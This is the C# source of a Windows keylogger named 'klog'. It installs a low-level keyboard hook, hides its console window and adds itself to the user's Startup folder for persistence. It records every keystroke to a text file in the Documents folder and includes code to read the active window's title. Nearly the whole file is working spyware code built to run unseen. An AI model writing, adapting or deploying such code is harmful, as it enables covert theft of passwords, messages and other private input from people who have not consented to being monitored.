using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Windows.Win32;
using Windows.Win32.Foundation;
using Windows.Win32.UI.WindowsAndMessaging;
using IWshRuntimeLibrary;
using File = System.IO.File;

namespace klog;

#pragma warning disable CA1416
public static class Program
{
    private static readonly LogBuffer Buffer = new();
    private static UnhookWindowsHookExSafeHandle? _kbHook;
    private static bool _capsLockActive;
    private static bool _shiftActive;

    public static unsafe void Main()
    {
        // user logout/system shutdown events
        SystemEvents.SessionEnding += (_, _) =>
        {
            _ = CleanupHandler();
        };
        // ctrl+c, ctrl+break, program close events
        // could use this to handle logout/shutdown but its much easier to use SystemEvents.SessionEnding because
        // https://learn.microsoft.com/en-us/windows/console/setconsolectrlhandler#remarks
        PInvoke.SetConsoleCtrlHandler(CleanupHandler, true);
        
        HideWindow();
        AddToStartup();

        var logFile =
            new LogFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "klog.txt"));
        Buffer.AddOutput(logFile);

        // TODO check something weird going on
        _capsLockActive = Keyboard.GetCapsLockState();

        // install a keyboard hook
        _kbHook = PInvoke.SetWindowsHookEx(
            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);

        // set up message queue
        MSG msg = new();
        while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
        {
            PInvoke.TranslateMessage(msg);
            PInvoke.DispatchMessage(msg);
        }
    }

    /// <summary>
    ///     Logs key presses to a file. Meant to be used with SetWindowsHookEx.
    /// </summary>
    private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
    {
        var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();

        // checking for events other than keydown, syskeydown and keyup
        // and https://learn.microsoft.com/en-us/windows/win32/winmsg/lowlevelmouseproc#ncode-in
        if (code != 0 || (wParam != KEYDOWN && wParam != KEYUP && wParam != SYSKEYDOWN))
            return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);

        var stringToWrite = "";

        // check for keydown
        if (wParam == KEYDOWN || wParam == SYSKEYDOWN)
            stringToWrite = Keyboard.HandleKeyDown(kbStruct, ref _shiftActive, ref _capsLockActive);

        // handle keyup events as it is important with shift, alt and control
        if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);

        Buffer.Add(stringToWrite);

        // StringBuffer.WriteToFile(stringToWrite, Writer);

        return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
    }
    
    /// <summary>
    /// Handler for SetConsoleCtrlHandler. Cleanup when program is closing.
    /// </summary>
    /// <param name="ctrlType"></param>
    /// <returns></returns>
    private static BOOL CleanupHandler(uint ctrlType = 7)
    {
        Buffer.Write();
        return true;
    }

    /// <summary>
    ///     Hides current console window.
    /// </summary>
    private static void HideWindow()
    {
        var hWnd = PInvoke.GetConsoleWindow();
        PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
    }

    /// <summary>
    /// Adds a shortcut to the executable to user's startup folder.
    /// </summary>
    private static void AddToStartup()
    {
        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        var shortcutPath = Path.Combine(startupFolderPath, "klog.lnk");
        var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "klog.exe");

        if (File.Exists(shortcutPath)) return;
        var wsh = new WshShell();
        if (wsh.CreateShortcut(shortcutPath) is not IWshShortcut shortcut) return;
        shortcut.TargetPath = path;
        shortcut.Save();
    }

    private static unsafe string GetWindowTitle()
    {
        var handle = PInvoke.GetForegroundWindow();
        var strLength = PInvoke.GetWindowTextLength(handle) + 1;
        var buffer = stackalloc char[strLength];
        if (PInvoke.GetWindowText(handle, buffer, strLength) > 0)
        {
            return Marshal.PtrToStringAuto((IntPtr)buffer) ?? string.Empty;
        }
        return string.Empty;
    }

    // ReSharper disable InconsistentNaming
    // codes passed by the keyboard hook
    private const int KEYDOWN = 0x0100;
    private const int KEYUP = 0x0101;

    private const int SYSKEYDOWN = 0x0104;
    // ReSharper restore InconsistentNaming
}

public interface ILogger
{
    public void Write(LogBuffer buffer);
}